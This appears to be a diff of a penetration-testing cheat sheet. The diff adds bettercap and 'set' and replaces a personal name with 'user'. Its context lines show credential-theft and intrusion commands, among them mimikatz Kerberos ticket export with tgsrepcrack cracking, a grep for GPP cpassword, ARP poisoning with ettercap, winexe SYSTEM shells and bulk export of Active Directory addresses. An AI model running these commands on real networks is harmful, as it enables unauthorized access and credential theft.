@@ -47,6 +47,9 @@ doskey /history
 # Requires PS command "import-module servermanager" (server only)
 # Requires PS command "Add-WindowsFeature -Name "RSAT-AD-PowerShell" -IncludeAllSubFeature (server only)
 
+# Show all defined paths
+set
+
 # Collect all AD email addresses
 Get-ADUser -Filter * -Properties DisplayName, EmailAddress, Title | select DisplayName, EmailAddress, Title | Export-CSV "E:\temp\EAddresses.csv"
 
@@ -109,7 +112,7 @@ smbclient -I <192.168.1.31> -L MONKEY -N -U ""
 
 # Windows mount NFS share
 mount [–o Options] ComputerName:\ShareName {DeviceName | *} 
- mount -t cifs //192.168.101.100/sales /mnt/cifs -o username=shareuser,password=sharepassword,domain=nixcraft
+ mount -t cifs //192.168.101.100/sales /mnt/cifs -o username=shareuser,password=sharepassword,domain=owned
 
 --------------------------------------------------------------------------------------------------------------------
 
@@ -181,7 +184,7 @@ winexe -U <domain>/<username> --uninstall --system -W <domain> //<IP> cmd.exe
 --------------------------------------------------------------------------------------------------------------------
 
 # VNC Viewer
-vncviewer -via tim.vancleave@10.0.8.17 localhost:2
+vncviewer -via user@10.0.8.17 localhost:2
 
 --------------------------------------------------------------------------------------------------------------------
 
@@ -251,6 +254,7 @@ grep -ri cpassword .
 
 #ARP Poison. Unified scan. Scan for hosts. Host list. Add hosts 1 & 2. Set sniff remote conn. Start sniffing.
 ettercap -G
+bettercap
 
 --------------------------------------------------------------------------------------------------------------------
 
@@ -388,7 +392,7 @@ C:\> mimikatz
 
 mimikatz # kerberos::list /export
 
-PS C:\Users\tim.vancleave.OWL\Desktop\Tools\SMB\mimikatz\x64> C:\Python27\python.exe .\tgsrepcrack.py .\rockyou.txt '.\*.kirbi'
+PS C:\Users\user\Desktop\Tools\SMB\mimikatz\x64> C:\Python27\python.exe .\tgsrepcrack.py .\rockyou.txt '.\*.kirbi'
 
 
 
